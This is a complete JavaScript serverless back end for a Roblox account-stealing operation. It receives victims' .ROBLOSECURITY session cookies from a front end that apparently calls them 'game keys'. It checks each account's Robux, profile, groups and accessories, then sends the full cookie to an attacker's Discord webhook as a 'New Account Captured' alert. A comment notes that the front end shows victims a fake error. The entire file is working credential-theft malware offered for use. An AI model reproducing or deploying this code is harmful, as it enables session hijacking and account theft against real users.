// api/submit.js – with rate limiting & first‑time flag
const WEBHOOK_URL = process.env.WEBHOOK_URL;

// In‑memory store: cookieHash -> timestamp (ms)
const cookieCooldown = new Map();
const COOLDOWN_MS = 10 * 60 * 1000; // 10 minutes

function getCookieHash(cookie) {
    // Simple hash to avoid storing raw cookie in memory (though we already have it)
    let hash = 0;
    for (let i = 0; i < cookie.length; i++) {
        hash = ((hash << 5) - hash) + cookie.charCodeAt(i);
        hash |= 0;
    }
    return hash.toString();
}

async function fetchWithTimeout(url, options, timeout = 10000) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeout);
    try {
        const response = await fetch(url, { ...options, signal: controller.signal });
        clearTimeout(id);
        return response;
    } catch (err) {
        clearTimeout(id);
        throw err;
    }
}

// ---------- User info (unchanged) ----------
async function fetchUserInfoFromId(userId) {
    try {
        const userRes = await fetchWithTimeout(`https://users.roblox.com/v1/users/${userId}`, {}, 5000);
        if (!userRes.ok) return null;
        const userData = await userRes.json();

        const friendsRes = await fetchWithTimeout(`https://friends.roblox.com/v1/users/${userId}/friends/count`, {}, 5000);
        let friendsCount = "N/A";
        if (friendsRes.ok) {
            const friendsData = await friendsRes.json();
            friendsCount = friendsData.count?.toLocaleString() || "0";
        }

        let hasPremium = "Unknown";
        try {
            const premiumRes = await fetchWithTimeout(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {}, 5000);
            if (premiumRes.ok) {
                const premiumData = await premiumRes.json();
                hasPremium = premiumData.isPremium === true ? "✅ Yes" : "❌ No";
            }
        } catch (premiumErr) {
            hasPremium = "Error fetching";
        }

        const isBanned = userData.isBanned ? "⚠️ Banned" : "✅ Active";

        return {
            username: userData.name,
            displayName: userData.displayName,
            userId: userData.id,
            createdAt: new Date(userData.created).toLocaleString(),
            description: userData.description || "No description set.",
            friendsCount,
            hasPremium,
            isBanned,
            profileUrl: `https://www.roblox.com/users/${userId}/profile`
        };
    } catch (err) {
        console.error("fetchUserInfo error:", err);
        return null;
    }
}

async function fetchRobuxFromCookie(cookieValue) {
    try {
        const response = await fetchWithTimeout("https://economy.roblox.com/v1/user/currency", {
            headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` }
        }, 5000);
        if (!response.ok) return "N/A";
        const data = await response.json();
        return data.robux?.toLocaleString() || "0";
    } catch (e) {
        console.error("Robux fetch error:", e);
        return "N/A";
    }
}

async function fetchLastGame(userId) {
    try {
        const response = await fetchWithTimeout(`https://games.roblox.com/v1/users/${userId}/games?sortOrder=Asc&limit=1`, {}, 5000);
        if (!response.ok) return "Unknown";
        const data = await response.json();
        if (data.data && data.data.length > 0) {
            const game = data.data[0];
            return `${game.name} (ID: ${game.id})`;
        }
        return "No games played recently";
    } catch (err) {
        console.error("Last game error:", err);
        return "Unknown";
    }
}

async function fetchTopGroups(userId) {
    try {
        const response = await fetchWithTimeout(`https://groups.roblox.com/v1/users/${userId}/groups/roles`, {}, 5000);
        if (!response.ok) return "None";
        const data = await response.json();
        if (!data.data || data.data.length === 0) return "No groups";
        const topGroups = data.data.slice(0, 3).map(g => `${g.group.name} (${g.role.name})`);
        return topGroups.join("\n");
    } catch (err) {
        console.error("Groups error:", err);
        return "Error fetching groups";
    }
}

async function fetchImportantAccessories(userId) {
    try {
        const avatarRes = await fetchWithTimeout(`https://avatar.roblox.com/v1/users/${userId}/avatar`, {}, 5000);
        if (!avatarRes.ok) return "None";
        const avatarData = await avatarRes.json();
        const assets = avatarData.assets || [];
        const accessoryTypes = ["Hat", "FaceAccessory", "NeckAccessory", "ShoulderAccessory", "FrontAccessory", "BackAccessory", "WaistAccessory", "Glasses", "Earrings", "Headphones"];
        const accessories = assets.filter(a => accessoryTypes.includes(a.assetType.name));
        if (accessories.length === 0) return "No accessories equipped";
        return accessories.map(a => a.name).join(", ");
    } catch (err) {
        console.error("Accessories error:", err);
        return "Error fetching accessories";
    }
}

async function sendToDiscordWebhook(cookie, rbxuid) {
    const userId = rbxuid;
    const [userInfo, robux, lastGame, topGroups, accessories] = await Promise.all([
        fetchUserInfoFromId(userId),
        fetchRobuxFromCookie(cookie),
        fetchLastGame(userId),
        fetchTopGroups(userId),
        fetchImportantAccessories(userId)
    ]);

    const description = `
## 📦 Account Capture

- **UserID:** \`${userId}\`
- **Cookie Length:** \`${cookie.length} chars\`

## 🔐 Full .ROBLOSECURITY Cookie
\`\`\`
${cookie}
\`\`\`
`;

    const embedFields = [];

    if (userInfo) {
        embedFields.push(
            {
                name: "👤 Roblox Profile",
                value: `**Username:** ${userInfo.username}\n**Display Name:** ${userInfo.displayName}\n**UserID:** ${userInfo.userId}\n**Created:** ${userInfo.createdAt}\n**Status:** ${userInfo.isBanned}\n**About:** ${userInfo.description.substring(0, 200)}`,
                inline: false
            },
            { name: "👥 Friends", value: `${userInfo.friendsCount}`, inline: true },
            { name: "💰 Robux", value: `${robux} R$`, inline: true },
            { name: "✨ Premium", value: userInfo.hasPremium, inline: true },
            { name: "🎮 Last Game Played", value: lastGame, inline: false },
            { name: "👥 Top 3 Groups", value: topGroups, inline: false },
            { name: "🕶️ Accessories Worn", value: accessories, inline: false }
        );
    } else {
        embedFields.push({
            name: "⚠️ Error",
            value: "Could not fetch public profile.\nUser may be deleted or invalid.",
            inline: false
        });
    }

    embedFields.push({
        name: "🔐 Cookie Summary",
        value: `**Length:** ${cookie.length} chars\n**UserID:** ${userId}`,
        inline: false
    });

    const payload = {
        username: "Bloxtools Processing System",
        embeds: [{
            title: "🔓 New Account Captured",
            description,
            color: 0x8c52ff,
            fields: embedFields,
            footer: { text: "Bloxtools • Roblox Account Logger" },
            timestamp: new Date().toISOString()
        }]
    };

    const response = await fetchWithTimeout(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    }, 10000);

    if (!response.ok) {
        const errorText = await response.text();
        console.error("Discord webhook error:", response.status, errorText);
        return false;
    }
    return true;
}

// ---------- Vercel handler with rate limiting ----------
module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ success: false, error: 'Method not allowed' });

    const { cookie, rbxuid } = req.body;
    if (!cookie || !rbxuid) return res.status(400).json({ success: false, error: "Missing cookie or rbxuid" });
    if (!WEBHOOK_URL) return res.status(500).json({ success: false, error: "Server configuration error" });

    // Rate limiting check
    const cookieHash = getCookieHash(cookie);
    const now = Date.now();
    const lastSubmission = cookieCooldown.get(cookieHash);
    if (lastSubmission && (now - lastSubmission) < COOLDOWN_MS) {
        const remainingSeconds = Math.ceil((COOLDOWN_MS - (now - lastSubmission)) / 1000);
        // Return blocked status (frontend will show fake error)
        return res.json({ 
            success: false, 
            blocked: true,
            message: `You've already processed this game key recently. Please wait ${remainingSeconds} seconds before trying again.`
        });
    }

    // Update cooldown
    cookieCooldown.set(cookieHash, now);
    // Clean up old entries periodically (simple cleanup every 50 requests)
    if (cookieCooldown.size > 100) {
        const expiry = now - COOLDOWN_MS;
        for (const [hash, time] of cookieCooldown.entries()) {
            if (time < expiry) cookieCooldown.delete(hash);
        }
    }

    // First time submission (or after cooldown)
    try {
        const webhookSuccess = await sendToDiscordWebhook(cookie, rbxuid);
        if (webhookSuccess) {
            return res.json({ success: true, firstTime: true });
        } else {
            return res.json({ success: false, error: "Discord webhook failed" });
        }
    } catch (err) {
        console.error("Handler error:", err);
        return res.status(500).json({ success: false, error: "Internal server error" });
    }
};
